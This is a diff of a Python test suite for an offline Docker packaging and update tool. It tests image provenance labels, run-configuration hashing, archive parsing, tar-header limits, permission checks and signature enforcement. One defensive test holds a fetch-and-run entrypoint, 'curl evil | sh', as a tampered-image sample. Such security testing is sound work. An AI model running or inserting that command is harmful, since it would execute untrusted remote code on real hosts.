@@ -62,6 +62,9 @@ IMAGE_ID, OLD_ID, NEXT_ID, OTHER_ID = (
 DB_IMAGE_ID = "sha256:" + "d" * 64
 TARGET = "chatbot5400:1.3.0-rc.1"
 
+DEPLOY_TAG = "chatbot5400:local"
+
+
 FAKE_DOCKER = r"""#!/usr/bin/env python3
 import hashlib, io, json, os, re, sys, tarfile
 state_path = os.environ["FAKE_DOCKER_STATE"]
@@ -80,13 +83,22 @@ def image_id(ref):
 def layers(iid):
     return json.loads(state["image_configs"][iid])["rootfs"]["diff_ids"]
 APP, DB = "open_notebook", "surrealdb"
+def image_config(iid):
+    # The run configuration of an image: its config blob's own `config`; an image
+    # the fake did not load and whose blob has none is the image just BUILT on the
+    # build machine and carries the labels of state["labels"] (build-package.sh).
+    blob = json.loads(state["image_configs"][iid])
+    if "config" in blob: return blob["config"]
+    if iid in state.get("loaded", {}): return {}
+    return {"Labels": state.get("labels", {})} if state.get("labels") else {}
 if argv[:2] == ["image", "inspect"]:
     iid = image_id(argv[-1])
     if iid is None: sys.exit(1)
     if "--format" in argv:
         out(iid + " " + json.dumps(layers(iid))); sys.exit(0)
     out([{"Id": iid, "Os": "linux", "Architecture": state.get("arch", "amd64"),
-          "Created": "2026-11-17T00:00:00Z", "Config": {"Labels": state.get("labels", {})}}]); sys.exit(0)
+          "Created": "2026-11-17T00:00:00Z", "RootFS": {"Type": "layers", "Layers": layers(iid)},
+          "Config": image_config(iid)}]); sys.exit(0)
 if argv[0] == "info":
     out({"{{.Architecture}}": "x86_64", "{{.DockerRootDir}}": state["root"], "{{.OSType}}": "linux"}[argv[-1]]); sys.exit(0)
 if argv[0] == "run" and "inventory" in argv:
@@ -113,6 +125,7 @@ if argv[0] == "load":
     if state.get("store") == "containerd":  # another image store: another image ID, same layers
         iid = "sha256:" + hashlib.sha256(b"containerd-manifest:" + config).hexdigest()
     state["image_configs"][iid] = config.decode()
+    state.setdefault("loaded", {})[iid] = True
     for tag in entry["RepoTags"]: state["images"][tag] = iid
     save(); out("Loaded image: " + ", ".join(entry["RepoTags"])); sys.exit(0)
 if argv[0] == "inspect":
@@ -308,6 +321,9 @@ def fake_docker(tmp_path, monkeypatch):
     state_path.write_text(json.dumps(state))
     monkeypatch.setenv("FAKE_DOCKER_STATE", str(state_path))
     monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
+    # `verify` (no --config) and load_package() read this file: STATE_DIR of the test
+    _write_minimal_conf(tmp_path)
+    monkeypatch.setenv("CB5400_OFFLINE_CONFIG", str(tmp_path / "offline-update.conf"))
 
     class Fake:
         path = state_path
@@ -379,7 +395,22 @@ def repo(tmp_path):
     return r
 
 
+def _label_image(repo, version="1.3.0-rc.1", git_ref="HEAD"):
+    """What build-package.sh / .ps1 do: the image carries the OCI revision and version
+    labels of the commit it was built from (R2-08). Labels of the fake's build image."""
+    state_path = Path(os.environ["FAKE_DOCKER_STATE"])
+    state = json.loads(state_path.read_text())
+    state["labels"] = {
+        "org.opencontainers.image.revision": _git(repo, "rev-parse", git_ref + "^{commit}"),
+        "org.opencontainers.image.version": version,
+    }
+    built = state["images"].get(f"chatbot5400:{version}")
+    state.get("loaded", {}).pop(built, None)  # it is the image just built here
+    state_path.write_text(json.dumps(state))
+
+
 def _build_rc(repo, out, *extra, version="1.3.0-rc.1"):
+    """A build as it is called; the image keeps whatever labels the fake gives it."""
     return OP.main(
         ["build", "--version", version, "--image", f"chatbot5400:{version}",
          "--repo", str(repo), "--out", str(out), *extra]
@@ -387,7 +418,9 @@ def _build_rc(repo, out, *extra, version="1.3.0-rc.1"):
 
 
 def _build(repo, tmp_path, *extra, version="1.3.0-rc.1", out="dist"):
+    """A build of an image made by the official script (labelled with this commit)."""
     out_dir = tmp_path / out
+    _label_image(repo, version)
     assert _build_rc(repo, out_dir, *extra, version=version) == 0
     pkg = next(out_dir.glob("*.tar.gz"))
     return pkg, OP.sha256_file(pkg)
@@ -433,11 +466,14 @@ def test_build_uses_docker_save_and_git_bundle(package, fake_docker, repo):
     ):  # fmt: skip
         assert f"{top}/{rel}" in names
     manifest = _manifest_of(pkg)
-    assert manifest["package_format_version"] == 2
+    assert manifest["package_format_version"] == 3  # 12D5: run config + provenance
     image = manifest["image"]
     assert image["id"] == IMAGE_ID and image["config_digest"] == IMAGE_ID
     assert image["diff_ids"] == json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]
     assert image["repo_tags"] == [TARGET]
+    assert image["run_config_sha256"] == OP.run_config_sha256({}, "linux", "amd64")
+    assert image["provenance"] == "verified" and image["app_version"] == "1.3.0"
+    assert image["labels"]["org.opencontainers.image.revision"] == _git(repo, "rev-parse", "HEAD")
     assert manifest["database"] == {
         "schema_version": 33,
         "migration_required": False,
@@ -473,6 +509,7 @@ def test_build_bundle_carries_a_named_ref_and_leaves_no_temp_ref(
 
 def test_build_accepts_a_commit_sha_and_a_ref_name(fake_docker, repo, tmp_path):
     sha = _git(repo, "rev-parse", "HEAD")
+    _label_image(repo)  # built from this commit by the official script (R2-08)
     assert _build_rc(repo, tmp_path / "a", "--git-ref", sha) == 0
     assert _build_rc(repo, tmp_path / "b", "--git-ref", "main") == 0
     assert _build_rc(repo, tmp_path / "c", "--git-ref", "no-such-ref") == OP.EXIT_USAGE
@@ -536,6 +573,7 @@ def test_interrupted_build_leaves_nothing_behind_and_can_be_repeated(
     fake_docker, repo, tmp_path
 ):
     """F-04: no half-built stage directory blocks the next run; no temp ref stays."""
+    _label_image(repo)
     fake_docker.set(save_rc=1)  # docker save fails (disk full, daemon stopped...)
     out = tmp_path / "dist"
     assert _build_rc(repo, out) == OP.EXIT_UPDATE
@@ -549,6 +587,7 @@ def test_interrupted_build_leaves_nothing_behind_and_can_be_repeated(
 def test_build_refuses_an_archive_with_more_tags_than_approved(
     fake_docker, repo, tmp_path
 ):
+    _label_image(repo)  # a well-made image: only the extra tag is wrong
     fake_docker.set(save_tags=[TARGET, "chatbot5400:latest"])
     assert _build_rc(repo, tmp_path / "dist") == OP.EXIT_USAGE
     assert not list((tmp_path / "dist").glob("ChatBot5400-*"))
@@ -599,9 +638,11 @@ def test_build_package_sh_checks_the_version_before_docker(
 def test_build_package_sh_builds_a_package_with_a_usable_bundle(
     fake_docker, repo_with_scripts, tmp_path
 ):
-    """F-04 through the real wrapper (it passes the commit SHA as --git-ref)."""
+    """F-04 through the real wrapper (it passes the commit SHA as --git-ref). With
+    --no-build the existing image must carry the labels the script's build step adds."""
     script = repo_with_scripts / "scripts" / "offline" / "build-package.sh"
     out = tmp_path / "o"
+    _label_image(repo_with_scripts)
     proc = subprocess.run(
         ["bash", str(script), "--version", "1.3.0-rc.1", "--no-build", "--out", str(out)],
         capture_output=True, text=True,
@@ -860,12 +901,23 @@ def test_image_archive_identity_docker_and_oci_layouts(tmp_path):
 
 
 def test_same_image_across_image_stores():
-    image = {"id": IMAGE_ID, "config_digest": IMAGE_ID,
+    """R2-06: another image store is recognised by its layers AND its run configuration
+    + platform; the layers alone are no identity (12D3 accepted them alone)."""
+    run_cfg = OP.run_config_sha256({}, "linux", "amd64")
+    image = {"id": IMAGE_ID, "config_digest": IMAGE_ID, "run_config_sha256": run_cfg,
              "diff_ids": json.loads(NEW_CONFIG)["rootfs"]["diff_ids"]}  # fmt: skip
+    other = "sha256:" + "9" * 64
     assert OP.same_image(IMAGE_ID, [], image) == "image id"
-    assert "layer" in OP.same_image("sha256:" + "9" * 64, image["diff_ids"], image)
-    assert OP.same_image("sha256:" + "9" * 64, ["sha256:" + "1" * 64], image) is None
-    assert OP.same_image("sha256:" + "9" * 64, [], image) is None
+    assert "layers + run configuration" in OP.same_image(other, image["diff_ids"], image, run_cfg)
+    assert OP.same_image(other, image["diff_ids"], image) is None  # layers alone
+    for changed in (
+        OP.run_config_sha256({"User": "root"}, "linux", "amd64"),
+        OP.run_config_sha256({"Entrypoint": ["/bin/sh", "-c", "x"]}, "linux", "amd64"),
+        OP.run_config_sha256({}, "linux", "arm64"),
+    ):
+        assert OP.same_image(other, image["diff_ids"], image, changed) is None
+    assert OP.same_image(other, ["sha256:" + "1" * 64], image, run_cfg) is None
+    assert OP.same_image(other, [], image) is None
 
 
 def _evil_tar(tmp_path, build):
@@ -1168,6 +1220,13 @@ def health_server():
     srv.shutdown()
 
 
+def _write_minimal_conf(tmp_path):
+    """Before any deployment exists: only where the tool keeps its state."""
+    (tmp_path / "offline-update.conf").write_text(
+        f"STATE_DIR={tmp_path / 'state'}\nALLOWED_SIGNERS={tmp_path / 'no-allowed-signers'}\n"
+    )
+
+
 def _write_conf(tmp_path, deploy, health, **extra):
     maint = tmp_path / "docker-compose.maintenance.yml"
     maint.write_text("services: {}\n")
@@ -1176,10 +1235,13 @@ def _write_conf(tmp_path, deploy, health, **extra):
         "DEPLOY_DIR": deploy,
         "COMPOSE_PROJECT": "cb-test",
         "COMPOSE_FILES": "docker-compose.yml",
+        "DEPLOY_IMAGE_TAG": DEPLOY_TAG,
         "STATE_DIR": tmp_path / "state",
+        "ALLOWED_SIGNERS": tmp_path / "no-allowed-signers",
         "MAINTENANCE_OVERRIDE": maint,
         "HEALTH_URL": health,
         "MIN_FREE_GB_EXTRA": "0",
+        "JOBS_WAIT_SECONDS": "30",
         **extra,
     }
     conf.write_text("".join(f"{k}={v}\n" for k, v in values.items()))
@@ -1978,7 +2040,7 @@ def test_journal_of_the_previous_tool_version(deployment, fake_docker, tmp_path)
     conf, pkg_dir, _ = deployment
     marker = _with_backup_cmd(conf, tmp_path)
     state = tmp_path / "state"
-    state.mkdir()
+    state.mkdir(exist_ok=True)  # verify already recorded its trusted result there
     old = {
         "version": "1.3.0-rc.1", "status": "rolled_back", "previous_image": OTHER_ID,
         "rollback_tag": "chatbot5400:rollback-old",
@@ -2001,7 +2063,7 @@ def test_old_journal_awaiting_approval_is_not_finished_blindly(
 ):
     conf, pkg_dir, _ = deployment
     state = tmp_path / "state"
-    state.mkdir()
+    state.mkdir(exist_ok=True)
     (state / "journal.json").write_text(
         json.dumps(
             {"version": "1.3.0-rc.1", "status": "awaiting_approval", "steps": []}
@@ -2184,7 +2246,7 @@ def test_damaged_journal_stops_everything_without_a_blind_reset(
 def test_damaged_journal_without_a_backup_copy(deployment, tmp_path, capsys):
     conf, _, _ = deployment
     state = tmp_path / "state"
-    state.mkdir()
+    state.mkdir(exist_ok=True)
     (state / "journal.json").write_text("{")
     assert _status(conf) == OP.EXIT_UPDATE
     assert "no readable backup copy" in capsys.readouterr().out
@@ -3000,3 +3062,236 @@ def test_attempt_is_not_resumed_across_a_source_sync(
 def test_sync_source_needs_a_git_checkout(deployment):
     conf, pkg_dir, _ = deployment
     assert _apply(conf, pkg_dir, "--sync-source") == OP.EXIT_UPDATE
+
+
+# Verbatim from `docker save` / `docker image inspect` of a busybox-based image on
+# Docker 29.10 with the containerd image store (lab image, revision label "a" * 40).
+REAL_CONFIG_BLOB = (
+    '{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:'
+    '/usr/bin:/sbin:/bin"],"Cmd":["sh","-c","while true; do sleep 3600; done"],"Labels":'
+    '{"org.opencontainers.image.revision":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},'
+    '"ArgsEscaped":true},"created":"2026-11-17T23:43:55.067511627Z","history":[{"created":'
+    '"2023-05-18T22:34:17Z","created_by":"BusyBox 1.36.1 (glibc), Debian 13"}],"os":"linux",'
+    '"rootfs":{"type":"layers","diff_ids":["sha256:97e4ece8f8a4d01b66df2c55c1f1e8a2860597b5'
+    '4dffbbc0df2f9942062cb34d","sha256:eb73bb1f2a67cbd1f99fba2b437ae06877ae36a5cc0252dbe7c58'
+    'bc7b221244b"]}}'
+)
+
+
+REAL_INSPECT_CONFIG = {
+    "ArgsEscaped": True,
+    "Cmd": ["sh", "-c", "while true; do sleep 3600; done"],
+    "Env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
+    "Labels": {"org.opencontainers.image.revision": "a" * 40},
+}
+
+
+def test_run_config_is_the_same_from_the_archive_and_from_docker_image_inspect():
+    """R2-06: the hash the manifest records (config blob of the archive) equals the one
+    the server computes from `docker image inspect` of the loaded image - in the shapes a
+    real Docker 29 prints - and changes with entrypoint, user, environment, platform."""
+    blob = json.loads(REAL_CONFIG_BLOB)
+    packaged = OP.run_config_sha256(blob["config"], blob["os"], blob["architecture"])
+    assert packaged == OP.run_config_sha256(REAL_INSPECT_CONFIG, "linux", "amd64")
+    classic = dict(
+        REAL_INSPECT_CONFIG, Hostname="", Domainname="", User="", AttachStdin=False,
+        Image="", Volumes=None, WorkingDir="", Entrypoint=None, OnBuild=None,
+    )  # fmt: skip
+    assert OP.run_config_sha256(classic, "linux", "x86_64") == packaged  # empty keys, alias
+    for changed in (
+        dict(REAL_INSPECT_CONFIG, Entrypoint=["/bin/sh", "-c", "curl evil | sh"]),
+        dict(REAL_INSPECT_CONFIG, User="root"),
+        dict(REAL_INSPECT_CONFIG, Env=REAL_INSPECT_CONFIG["Env"] + ["SURREAL_URL=ws://x"]),
+        dict(REAL_INSPECT_CONFIG, Labels={}),
+    ):
+        assert OP.run_config_sha256(changed, "linux", "amd64") != packaged
+    assert OP.run_config_sha256(REAL_INSPECT_CONFIG, "linux", "arm64") != packaged
+
+
+def _blob(data):
+    raw = json.dumps(data).encode() if not isinstance(data, bytes) else data
+    return "sha256:" + hashlib.sha256(raw).hexdigest(), raw
+
+
+def _docker29_archive(path, manifest_json=True):
+    """A `docker save` archive as Docker 29 (containerd store) writes it: index.json ->
+    image index (the platform manifest + a buildkit attestation manifest) and, next to
+    it, the docker-archive manifest.json."""
+    config_digest, config = _blob(REAL_CONFIG_BLOB.encode())
+    manifest_digest, manifest = _blob({
+        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.manifest.v1+json",
+        "config": {"mediaType": "application/vnd.oci.image.config.v1+json",
+                   "digest": config_digest, "size": len(config)},
+        "layers": [],
+    })  # fmt: skip
+    attestation_digest, attestation = _blob({
+        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.manifest.v1+json",
+        "artifactType": "application/vnd.docker.attestation.manifest.v1+json",
+        "config": {"mediaType": "application/vnd.oci.empty.v1+json",
+                   "digest": _blob(b"{}")[0], "size": 2},
+        "layers": [],
+    })  # fmt: skip
+    index_digest, index = _blob({
+        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json",
+        "manifests": [
+            {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": manifest_digest,
+             "size": len(manifest), "platform": {"architecture": "amd64", "os": "linux"}},
+            {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": attestation_digest,
+             "size": len(attestation),
+             "annotations": {"vnd.docker.reference.digest": manifest_digest,
+                             "vnd.docker.reference.type": "attestation-manifest"},
+             "platform": {"architecture": "unknown", "os": "unknown"}},
+        ],
+    })  # fmt: skip
+    outer = json.dumps({
+        "schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json",
+        "manifests": [{"mediaType": "application/vnd.oci.image.index.v1+json",
+                       "digest": index_digest, "size": len(index),
+                       "annotations": {"io.containerd.image.name": "docker.io/lab/app:1.3.0",
+                                       "org.opencontainers.image.ref.name": "1.3.0"}}],
+    }).encode()  # fmt: skip
+    files = [("index.json", outer), ("oci-layout", b'{"imageLayoutVersion":"1.0.0"}')]
+    for digest, raw in ((config_digest, config), (manifest_digest, manifest),
+                        (attestation_digest, attestation), (index_digest, index)):  # fmt: skip
+        files.append(("blobs/" + digest.replace(":", "/"), raw))
+    if manifest_json:
+        files.append(("manifest.json", json.dumps([{
+            "Config": "blobs/" + config_digest.replace(":", "/"),
+            "RepoTags": ["lab/app:1.3.0"], "Layers": [],
+        }]).encode()))  # fmt: skip
+    with tarfile.open(path, "w") as tar:
+        for name, raw in files:
+            info = tarfile.TarInfo(name)
+            info.size = len(raw)
+            tar.addfile(info, io.BytesIO(raw))
+    return config_digest, index_digest
+
+
+@pytest.mark.parametrize("manifest_json", [True, False], ids=["docker29", "oci-only"])
+def test_image_archive_identity_of_a_docker29_containerd_archive(tmp_path, manifest_json):
+    """F-20 / R2-06 with the real layout: the image ID of the containerd store is the
+    INDEX digest, the config digest is another value, the index lists an attestation
+    manifest, the image name is fully qualified. Both readings give the same identity."""
+    archive = tmp_path / "save.tar"
+    config_digest, index_digest = _docker29_archive(archive, manifest_json)
+    ident = OP.image_archive_identity(archive)
+    assert ident["layout"] == ("docker-archive" if manifest_json else "oci")
+    assert ident["repo_tags"] == ["lab/app:1.3.0"]
+    assert ident["config_digest"] == config_digest != index_digest
+    assert ident["diff_ids"] == json.loads(REAL_CONFIG_BLOB)["rootfs"]["diff_ids"]
+    assert ident["run_config_sha256"] == OP.run_config_sha256(REAL_INSPECT_CONFIG, "linux", "amd64")
+    image = {"id": index_digest, "config_digest": config_digest, "diff_ids": ident["diff_ids"],
+             "run_config_sha256": ident["run_config_sha256"]}  # fmt: skip
+    assert OP.same_image(index_digest, [], image) == "image id"  # containerd -> containerd
+    assert "classic" in OP.same_image(config_digest, [], image)  # classic store server
+    assert "run configuration" in OP.same_image(
+        "sha256:" + "5" * 64, ident["diff_ids"], image, ident["run_config_sha256"]
+    )
+
+
+def _pax_record(key, value):
+    body = f" {key}={value}\n"
+    length = len(body) + 1
+    while len(str(length)) + len(body) != length:
+        length = len(str(length)) + len(body)
+    return f"{length}{body}".encode()
+
+
+def test_prescan_accepts_normal_extended_headers_and_refuses_oversized_ones(tmp_path):
+    ok = tmp_path / "ok.tar.gz"
+    with tarfile.open(ok, "w:gz", format=tarfile.PAX_FORMAT) as tar:
+        info = tarfile.TarInfo("pkg/" + "x" * 150)  # needs a pax path record
+        info.size = 5
+        info.pax_headers = {"comment": "y" * 2000}
+        tar.addfile(info, io.BytesIO(b"hello"))
+    OP.prescan_archive(ok)
+    assert [m.name for m in OP.inspect_archive(ok)] == ["pkg/" + "x" * 150]
+    for kind, build in (
+        ("pax", lambda t: t.addfile(_pax_member("pkg/a", 70 * 1024), io.BytesIO(b"a"))),
+        ("gnu long link", lambda t: _gnu_long_link(t, 70 * 1024)),
+    ):
+        bad = tmp_path / f"{kind.replace(' ', '-')}.tar.gz"
+        fmt = tarfile.PAX_FORMAT if kind == "pax" else tarfile.GNU_FORMAT
+        with tarfile.open(bad, "w:gz", format=fmt) as tar:
+            build(tar)
+        with pytest.raises(OP.Refused, match="oversized extended tar header"):
+            OP.inspect_archive(bad)
+    record = _pax_record("size", 9 * 1024**3) + _pax_record("path", "pkg/big")
+    assert OP._pax_size(record) == 9 * 1024**3  # >= 8 GiB members carry their size here
+    assert OP._pax_size(_pax_record("path", "pkg/x")) is None
+    broken = tmp_path / "broken.tar"
+    with tarfile.open(broken, "w") as tar:
+        info = tarfile.TarInfo("pkg/a")
+        info.size = 1
+        tar.addfile(info, io.BytesIO(b"a"))
+    raw = bytearray(broken.read_bytes())
+    raw[0:3] = b"zzz"  # the header checksum no longer matches
+    broken.write_bytes(bytes(raw))
+    with pytest.raises(OP.Refused, match="checksum"):
+        OP.prescan_archive(broken)
+
+
+def _pax_member(name, comment_size):
+    info = tarfile.TarInfo(name)
+    info.size = 1
+    info.pax_headers = {"comment": "z" * comment_size}
+    return info
+
+
+def _gnu_long_link(tar, size):
+    info = tarfile.TarInfo("pkg/link")
+    info.type = tarfile.SYMTYPE
+    info.linkname = "t" * size
+    tar.addfile(info)
+
+
+def test_package_folder_writable_by_others_or_without_a_trusted_record_is_refused(
+    deployment, tmp_path
+):
+    conf, pkg_dir, _ = deployment
+
+    def preflight():
+        return _server("preflight", conf, pkg_dir, "--backup-reference", "x")
+
+    assert preflight() == 0
+    script = pkg_dir / "scripts" / "update.sh"
+    script.chmod(0o777)  # a file anybody can replace after verification
+    assert preflight() == OP.EXIT_PREFLIGHT
+    script.chmod(0o755)
+    pkg_dir.parent.chmod(0o777)  # an ancestor anybody can write
+    assert preflight() == OP.EXIT_PREFLIGHT
+    pkg_dir.parent.chmod(0o1777)  # sticky (like /tmp): allowed as an ancestor
+    assert preflight() == 0
+    pkg_dir.parent.chmod(0o755)
+    for record in (tmp_path / "state" / "verified").iterdir():
+        record.unlink()  # the trusted record is gone: the package next to it proves nothing
+    assert (pkg_dir.parent / "verify-report.json").exists()
+    assert preflight() == OP.EXIT_PREFLIGHT
+
+
+@needs_ssh_keygen
+def test_signature_policy_required_is_enforced_on_every_use(
+    fake_docker, repo, tmp_path, signing, health_server, monkeypatch
+):
+    """With a trusted key installed the policy is `required`: verify refuses an unsigned
+    package even with the trusted-channel hash, and every server command checks the
+    signature again (from the policy, never from a flag of a report)."""
+    key, signers = signing
+    deploy = tmp_path / "deploy"
+    deploy.mkdir()
+    conf = _write_conf(tmp_path, deploy, health_server, ALLOWED_SIGNERS=signers)
+    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
+    unsigned, digest = _build(repo, tmp_path, out="unsigned")
+    assert _verify(unsigned, tmp_path / "u", "--expected-sha256", digest) == OP.EXIT_VERIFY
+    _set_conf(conf, SIGNATURE_POLICY="optional")  # explicit operator choice
+    assert _verify(unsigned, tmp_path / "u2", "--expected-sha256", digest) == 0
+    _set_conf(conf, SIGNATURE_POLICY="required")
+    signed, _ = _build(repo, tmp_path, "--sign-key", str(key), out="signed")
+    assert _verify(signed, tmp_path / "s") == 0
+    pkg_dir = next(p for p in (tmp_path / "s").iterdir() if p.is_dir())
+    fake_docker.forget_image(TARGET)
+    assert _server("preflight", conf, pkg_dir, "--backup-reference", "x") == 0
+    (pkg_dir / "manifest.json.sig").unlink()
+    assert _server("preflight", conf, pkg_dir, "--backup-reference", "y") == OP.EXIT_PREFLIGHT
+    u2 = next(p for p in (tmp_path / "u2").iterdir() if p.is_dir())
+    assert _server("preflight", conf, u2, "--backup-reference", "z") == OP.EXIT_PREFLIGHT
